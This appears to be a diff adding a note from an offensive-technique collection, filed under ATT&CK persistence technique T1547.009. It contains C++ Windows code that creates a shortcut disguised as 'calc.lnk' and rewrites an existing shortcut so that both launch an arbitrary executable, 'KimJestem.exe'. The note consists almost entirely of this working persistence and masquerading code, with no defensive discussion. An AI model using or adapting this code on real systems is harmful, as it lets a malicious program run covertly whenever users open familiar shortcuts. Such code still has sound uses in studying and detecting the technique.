@@ -1,0 +1,71 @@
+---
+title: ".009.Shortcut Modification"
+folder: "05. Persistence/T1547 Boot or Logon Autostart Execution"
+---
+
+
+
+
+#include <windows.h>
+#include <shobjidl.h>
+#include <objbase.h>
+#include <windows.h>
+#include <shobjidl.h>
+#include <shlguid.h>
+#include <initguid.h>
+#include <string>
+#include <fstream>
+#include <iostream>
+
+int SkrotdoAPk() {
+    CoInitialize(NULL);
+
+    IShellLink* pShellLink;
+    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
+
+    pShellLink->SetPath(L"C:\\Users\\User\\Desktop\\KimJestem.exe");
+
+    IPersistFile* pPersistFile;
+    pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
+
+    pPersistFile->Save(L"C:\\Users\\User\\Desktop\\calc.lnk", TRUE);
+
+    pPersistFile->Release();
+    pShellLink->Release();
+
+    CoUninitialize();
+
+    return 0;
+}
+int ModyfApk() {
+    CoInitialize(NULL);
+
+    IShellLink* pShellLink;
+    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
+
+    IPersistFile* pPersistFile;
+    pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
+
+    pPersistFile->Load(L"C:\\Users\\User\\Desktop\\Pobrane — skrót.lnk", STGM_READWRITE);
+
+    std::wstring newTargetPath = L"C:\\Users\\User\\Desktop\\KimJestem.exe";
+    pShellLink->SetPath(newTargetPath.c_str());
+
+    pPersistFile->Save(NULL, TRUE);
+
+    pPersistFile->Release();
+    pShellLink->Release();
+
+    CoUninitialize();
+
+    return 0;
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    SkrotdoAPk();
+    ModyfApk();
+    return 0;
+}
